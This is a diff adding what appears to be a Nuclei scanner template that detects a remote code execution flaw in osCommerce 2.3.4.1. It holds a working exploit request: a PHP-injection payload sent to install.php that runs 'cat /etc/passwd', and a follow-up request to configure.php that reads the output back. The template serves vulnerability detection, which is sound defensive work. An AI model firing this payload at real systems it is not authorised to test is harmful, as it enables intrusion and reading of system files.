@@ -1,0 +1,37 @@
+http:
+    - matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /install/install.php?step=4 HTTP/1.1
+          Host: {{Hostname}}
+          Accept: */*
+          Content-Type: application/x-www-form-urlencoded
+
+          DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27cat+%2Fetc%2Fpasswd%27%29%3B%2F%2A
+        - |
+          GET /install/includes/configure.php HTTP/1.1
+          Host: {{Hostname}}
+          Accept: */*
+id: oscommerce-rce
+info:
+    author: Suman_Kar
+    description: osCommerce 2.3.4.1 is susceptible to remote code execution via install.php. A remote attacker can inject PHP code into the db_database parameter and subsequently use the configure.php page to to read the command's executed output.
+    metadata:
+        max-request: 2
+    name: osCommerce 2.3.4.1 - Remote Code Execution
+    reference:
+        - https://www.exploit-db.com/exploits/50128
+        - https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution
+    severity: high
+    tags:
+        - oscommerce
+        - edb
+        - OSCommerce
